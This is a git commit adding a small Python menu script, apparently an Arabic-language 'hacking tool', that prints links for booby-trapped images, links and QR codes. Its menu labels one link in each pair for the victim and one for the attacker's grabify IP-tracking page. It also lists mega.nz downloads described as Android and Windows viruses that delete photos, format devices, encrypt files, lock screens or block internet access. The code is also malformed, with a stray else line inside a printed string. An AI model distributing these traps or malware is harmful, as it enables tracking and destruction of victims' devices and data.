d5b87d8d6180c50326ba4321208e6ec038fea46a
SoloHacker404 <114489214+SoloHacker404@users.noreply.github.com>
2023-07-03 21:12:57 +0300

    Create arabstorm.py
    First Arabian tool in linux

---
+++ arabstorm.py
@@ -0,0 +1,75 @@
+print ("""------------------------------------------------
+   ○○
+  □□□□
+ □   □     ○                   □□
+ □   □                         □□
+  □□□□    □□□   □              □□
+    □□   □   □  □□□□□□         □□     □□□□
+    □□   □   □  □     □        □□     □
+    □□□□□□□□□□□□□□□□□□□        □□□□□□□□□□□
+
+                                 ■■ ■■
+                          ■■■■   ■■ ■■
+                         ■       ■■ ■■
+     ■■    ■■      ■■■■■■■■■■■■■■■■ ■■
+     ■■■■■■■■     ■■
+        ●        ■■
+-----------------------------------------------------
+ made by solohacker404 | github: solohacker404
+_____________________________________________________""")
+
+
+
+print ("ﺔﻤﻐﻠﻣ ةﺭﻮﺻ ﺔﻋﺎﻨﺻ[1]")
+print ("ﻢﻐﻠﻣ ﻂﺑﺍﺭ ﺔﻋﺎﻨﺻ[2]")
+print ("سﻭﺮﻳﺎﻓ ﺔﻋﺎﻨﺻ[3]")
+print (":ﻤﻐﻠﻤﻟﺍ QR ﺔﻋﺎﻨﺻ[4]")
+user_input = input("ةﺍﺩﻻﺍ ﻢﻗﺭ ﻞﺧﺩﺍ")
+if user_input == "1": print("""
+:(ﺔﻴﺤﻀﻟﺍ) ﺔﻤﻐﻠﻤﻟﺍ ةﺭﻮﺼﻟﺍ ﻂﺑﺍﺭ
+  http://grabify.social-previews.top/pultxu
+             (ﺮﻜﻬﻟﺍ) ﺪﻴﺼﺘﻤﻟﺍ ﻂﺑﺍر
+ https://grabify.link/track/42Z3MG
+""")
+elif user_input == "2": print("""
+(ﺮﻜﻬﻟﺍ) ﺪﻴﺼﺘﻤﻟﺍ ﻂﺑﺍر
+ https://grabify.link/track/42Z3MG
+
+::(ﺔﻴﺤﻀﻟﺍ) ﻤﻐﻠﻤﻟﺍ  ﻂﺑﺍﺭ
+ https://grabify.link/E9BQDU
+""")
+elif user_input =="3" : print("""
+:ﺪﻳﻭﺭﺪﻧﺍ تﺎﺳﻭﺮﻴﻓ
+else : print ("dont any tool have this number")
+: رﻮﺼﻟﺍ فﺬﺣ سﻭﺮﻳﺎﻓ
+https://mega.nz/file/dtxhWQQD#DO-d-ULuerssoJhN2gSGwFlKWPitUBvAkqvCVqIZfUg
+
+:(تﻭﺭ  يﻮﺘﺤﺗ ﻲﺘﻟﺍ ةﺰﻬﺟﻸﻟ) زﺎﻬﺟ ﺖﺘﻣﺮﻓ سﻭﺮﻳﺎﻓ
+https://mega.nz/file/s8ZBXaKT#GNdvfNk0TKVuTN8wgVTK4yJkuizgYRNPdo8LsQcRgr4
+
+:ﺔﺷﺎﺷ ﺐﺠﺣﻭ ﺮﻴﻔﺸﺗ سﻭﺮﻳﺎﻓ
+https://mega.nz/file/hxR1XSxT#XOWyl15sBJxoAbuJ-tWRskpiDQwtDBXKQk8TJ0oeRUg
+
+
+
+
+
+
+
+
+
+:زﻭﺪﻨﻳﻭ تﺎﺳﻭﺮﻴﻓ
+
+
+: (ﺖﻧﺮﺘﻧﻻﺎﺑ لﺎﺼﺗﻻﺍ ﻊﻧﺎﻣ)ip  ﺮﻈﺣ
+https://mega.nz/file/EoRy1I7K#u3eTLkDrYArov2RfI_qFBqx76eR31FGM6Z-akS9poNk
+
+:زﻭﺪﻨﻳﻭ ﺮﻴﻔﺸﺗ
+https://mega.nz/file/5ppjSaqK#VeOgRzV1C3Ttb_IbE7vByLq-FlrhB3mJi1qDp5uSyEU
+""")
+elif user_input =="4" : print(""":ﻤﻐﻠﻤﻟﺍ QR ﻂﺑﺍر
+ https://drive.google.com/file/d/1Y6cvRYtXLI20c8YXPCtHRxdNbqDvEEw7/view?usp=drivesdk
+ (ﺮﻜﻬﻟﺍ) ﺪﻴﺼﺘﻤﻟﺍ ﻂﺑﺍر
+ https://grabify.link/track/42Z3MG
+""")
+else : print ("error404 :tool not found")
